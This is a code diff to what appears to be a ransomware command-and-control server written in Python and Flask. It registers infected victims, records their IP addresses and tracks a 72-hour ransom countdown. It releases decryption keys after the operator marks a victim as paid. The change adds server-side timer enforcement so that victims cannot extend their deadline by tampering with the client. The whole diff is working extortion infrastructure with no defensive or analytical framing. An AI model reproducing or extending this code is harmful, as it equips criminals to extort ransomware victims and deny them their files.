@@ -1,4 +1,3 @@
-# c2_server.py
 import os
 import base64
 import requests
@@ -6,6 +5,7 @@ import datetime
 import io
 import socket
 import qrcode
+import time
 from flask import Flask, request, jsonify, render_template_string, redirect, url_for, render_template, send_file
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import serialization, hashes
@@ -192,6 +192,9 @@ def checkin():
     # Use URL-safe base64 to prevent routing issues with '/' characters
     victim_id = base64.urlsafe_b64encode(os.urandom(8)).decode('utf-8').rstrip('=')
     
+    # Store timestamp for server-side timer enforcement
+    start_timestamp = time.time()
+    
     # Handle Mobile Simulation (fake key)
     if encrypted_aes_key_b64 == 'MOBILE_SIMULATION':
         victims[victim_id] = {
@@ -200,8 +203,10 @@ def checkin():
             "encrypted_key": "MOBILE_SIMULATION",
             "decrypted_key": "MOBILE_UNLOCK_CODE", # Auto-ready once paid
             "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "start_timestamp": start_timestamp,
             "timer": 72 * 3600,
             "ip": request.remote_addr
+            
         }
         print(f"[+] New Mobile Victim: {victim_id}")
         return jsonify({"victim_id": victim_id})
@@ -213,6 +218,7 @@ def checkin():
         "decrypted_key": None,
         "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "checkin_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "start_timestamp": start_timestamp,
         "timer": 72 * 3600, # Default 72 hours
         "ip": request.remote_addr
     }
@@ -224,33 +230,43 @@ def get_status(victim_id):
     if victim_id not in victims:
         return jsonify({"status": "unknown"}), 404
     
-    # Sync timer if provided by victim
-    current_time_left = request.args.get('time_left', type=int)
-    if current_time_left is not None:
-        # Update our record, unless we have a pending override waiting to be picked up
-        if 'pending_timer_update' not in victims[victim_id]:
-            victims[victim_id]['timer'] = current_time_left
-
-    # Support server-side countdown (approximate) or client sync
-    # If client sends 'time_left', we update our record
-    client_time = request.json.get('time_left') if request.is_json else None
-    if client_time is not None:
-         victims[victim_id]['timer'] = client_time
-
+    victim_data = victims[victim_id]
+    
+    # --- SERVER-SIDE TIMER ENFORCEMENT ---
+    # Calculate how much time has REALLY passed since infection
+    elapsed = time.time() - victim_data.get('start_timestamp', time.time())
+    server_time_left = max(0, int((72 * 3600) - elapsed))
+    
+    # Update our server record to reflect reality
+    victim_data['timer'] = server_time_left
+    
     response = {
         "status": "waiting", 
-        "server_timer": victims[victim_id].get('timer', 72*3600)
+        "server_timer": server_time_left
     }
     
+    # Check if we need to force-update the victim's timer
+    # (If victim reports significantly more time than server thinks they have)
+    victim_reported_time = request.args.get('time_left', type=int)
+    if victim_reported_time is not None:
+        if server_time_left < (victim_reported_time - 60): # 60s buffer
+            response["new_timer"] = server_time_left
+
     # Check for direct key delivery
-    if victims[victim_id]['status'] == 'KEY_SENT' and victims[victim_id].get('decrypted_key'):
+    if victim_data['status'] == 'KEY_SENT' and victim_data.get('decrypted_key'):
         response["status"] = "ready"
-        response["key"] = victims[victim_id]['decrypted_key']
+        response["key"] = victim_data['decrypted_key']
     
-    # Check for timer override to send to victim
-    if 'pending_timer_update' in victims[victim_id]:
-        response["new_timer"] = victims[victim_id]['pending_timer_update']
-        del victims[victim_id]['pending_timer_update'] # Clear after sending
+    # Check for manual timer overrides (Dashboard buttons)
+    if 'pending_timer_update' in victim_data:
+        response["new_timer"] = victim_data['pending_timer_update']
+        # Reset start_timestamp to match the new manual time
+        # New Start = Now - (72h - New_Time)
+        # So: Elapsed = 72h - New_Time
+        new_elapsed = (72 * 3600) - victim_data['pending_timer_update']
+        victim_data['start_timestamp'] = time.time() - new_elapsed
+        
+        del victim_data['pending_timer_update'] 
         
     return jsonify(response)
 
